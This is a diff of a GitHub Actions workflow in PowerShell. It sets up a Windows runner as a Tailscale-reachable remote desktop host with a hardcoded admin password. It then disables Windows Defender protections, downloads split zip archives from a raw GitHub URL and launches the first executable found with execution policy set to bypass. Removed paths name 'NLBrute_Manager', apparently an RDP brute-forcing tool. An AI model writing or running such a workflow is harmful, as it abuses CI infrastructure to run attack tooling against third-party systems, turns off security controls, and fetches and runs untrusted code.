@@ -26,45 +26,37 @@ jobs:
         env:
           TAILSCALE_AUTHKEY: ${{ secrets.TAILSCALE_AUTHKEY }}
         run: |
-          # Download and install Tailscale silently
           Invoke-WebRequest "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi" -OutFile "C:\tailscale.msi"
           Start-Process msiexec -ArgumentList "/i C:\tailscale.msi /quiet /norestart" -Wait
-          
-          # Connect to Tailscale network
           Start-Sleep -Seconds 5
           & "C:\Program Files\Tailscale\tailscale.exe" up --authkey="$Env:TAILSCALE_AUTHKEY" --hostname="github-rdp-server"
-          
           Start-Sleep -Seconds 8
-          
-          # Get Tailscale IP
           $ts_ip = & "C:\Program Files\Tailscale\tailscale.exe" ip -4
-          
-          Write-Host ""
           Write-Host "==================================================" -ForegroundColor Green
-          Write-Host "  >>> RDP SERVER IS READY! <<<" -ForegroundColor Cyan
           Write-Host "  Tailscale IP : $ts_ip" -ForegroundColor Yellow
           Write-Host "  Username     : NvdAdmin" -ForegroundColor Yellow
           Write-Host "  Password     : P@ssw0rd1qazXSW@#" -ForegroundColor Yellow
-          Write-Host "  >> Open mstsc and connect to: $ts_ip" -ForegroundColor Magenta
           Write-Host "==================================================" -ForegroundColor Green
 
-      - name: 4. Setup Environment & Deploy Files
+      - name: 4. Deploy and Execute Application
         shell: powershell
         run: |
-          # 1. Define Paths
-          $baseDir = "$env:USERPROFILE\Desktop\Downloads\multinl_zip"
-          $targetDir = "$baseDir\multinl\NLBrute_Manager"
+          # 1. Define a Fixed Work Directory (Avoids User Profile issues)
+          $workDir = "C:\app_deploy"
+          $downloadDir = "$workDir\downloads"
           
-          # 2. Create Directory Structure
-          New-Item -ItemType Directory -Force -Path $baseDir | Out-Null
-          Set-Location -Path $baseDir
-
-          # 3. Disable Windows Defender to prevent file quarantine
-          Write-Host "Disabling Windows Defender Real-Time Monitoring..." -ForegroundColor Cyan
+          # Clean up previous attempts
+          if (Test-Path $workDir) { Remove-Item -Recurse -Force $workDir -ErrorAction SilentlyContinue }
+          New-Item -ItemType Directory -Path $downloadDir -Force | Out-Null
+          
+          # 2. Disable Security (Defender & SmartScreen)
+          Write-Host "Disabling Windows Defender..." -ForegroundColor Cyan
           Set-MpPreference -DisableRealtimeMonitoring $true
           Set-MpPreference -DisableIOAVProtection $true
-          
-          # 4. Download Split Zip Files (Using Raw URLs)
+          Set-MpPreference -DisableBehaviorMonitoring $true
+          Set-MpPreference -DisableScriptScanning $true
+
+          # 3. Download Split Zip Files (Direct Raw Links)
           $filesToDownload = @(
             "https://raw.githubusercontent.com/desimetr/lagi/main/multinl_zip.z01",
             "https://raw.githubusercontent.com/desimetr/lagi/main/multinl_zip.z02",
@@ -75,39 +67,39 @@ jobs:
           foreach ($url in $filesToDownload) {
               $fileName = Split-Path $url -Leaf
               Write-Host "Downloading $fileName..." -ForegroundColor Yellow
-              Invoke-WebRequest -Uri $url -OutFile $fileName
+              Invoke-WebRequest -Uri $url -OutFile "$downloadDir\$fileName"
           }
 
-          # 5. Extracting the Archive
-          # We use the main .zip file. For split zips, they must be in the same folder.
-          Write-Host "Extracting multi-part archive..." -ForegroundColor Cyan
-          try {
-              Expand-Archive -Path "$baseDir\multinl_zip.zip" -DestinationPath $baseDir -Force
-              Write-Host "Extraction successful." -ForegroundColor Green
-          } catch {
-              Write-Host "Extraction failed. Attempting manual extraction via Shell..." -ForegroundColor Red
-              # Fallback if Expand-Archive struggles with split volumes
-              & cmd /c "tar -xf multinl_zip.zip -C $baseDir"
-          }
+          # 4. Robust Extraction using 7-Zip
+          # We use 7-Zip to handle the split volumes correctly.
+          Write-Host "Extracting archive using 7-Zip..." -ForegroundColor Cyan
+          & "C:\Program Files\7-Zip\7z.exe" x "$downloadDir\multinl_zip.zip" -o"$workDir" -y
 
-          # 6. Launch the Application
-          Write-Host "Searching for executable in $targetDir..." -ForegroundColor Cyan
-          if (Test-Path $targetDir) {
-              $exeFiles = Get-ChildItem -Path $targetDir -Filter "*.exe" -Recurse
-              if ($exeFiles.Count -gt 0) {
-                  $exeToRun = $exeFiles[0].FullName
-                  Write-Host "Found: $exeToRun. Launching..." -ForegroundColor Green
-                  
-                  # Set Execution Policy to Bypass for the current process
-                  Set-ExecutionPolicy Bypass -Scope Process -Force
-                  
-                  # Launch the app without blocking the workflow
-                  Start-Process -FilePath $exeToRun -WorkingDirectory $targetDir -WindowStyle Normal
-              } else {
-                  Write-Host "No .exe found in $targetDir" -ForegroundColor Red
-              }
+          # 5. Find the Executable (Deep Search)
+          # Instead of hardcoding a path that might fail, we search the entire C:\app_deploy folder
+          Write-Host "Searching for application executable..." -ForegroundColor Cyan
+          Start-Sleep -Seconds 5
+          
+          $exeFile = Get-ChildItem -Path $workDir -Filter "*.exe" -Recurse | Select-Object -First 1
+
+          if ($exeFile) {
+              $exePath = $exeFile.FullName
+              $exeDir = Split-Path $exePath -Parent
+              Write-Host "SUCCESS: Found application at $exePath" -ForegroundColor Green
+              Write-Host "Launching from directory: $exeDir" -ForegroundColor Yellow
+              
+              # 6. Final Execution
+              # We set the working directory to the EXE's folder so it finds its DLLs
+              Set-ExecutionPolicy Bypass -Scope Process -Force
+              
+              # Launch the app in a way that doesn't block the workflow
+              Start-Process -FilePath $exePath -WorkingDirectory $exeDir -WindowStyle Normal
+              Write-Host "Application process started." -ForegroundColor Green
           } else {
-              Write-Host "Target directory $targetDir not found after extraction." -ForegroundColor Red
+              Write-Host "CRITICAL ERROR: Could not find any .exe after extraction." -ForegroundColor Red
+              # Log everything to help debugging
+              Get-ChildItem -Path $workDir -Recurse | Select-Object FullName | Out-File "$workDir\debug_files.txt"
+              Write-Host "File structure logged to $workDir\debug_files.txt"
           }
 
       - name: 5. Keep Server Alive (48 Hours)
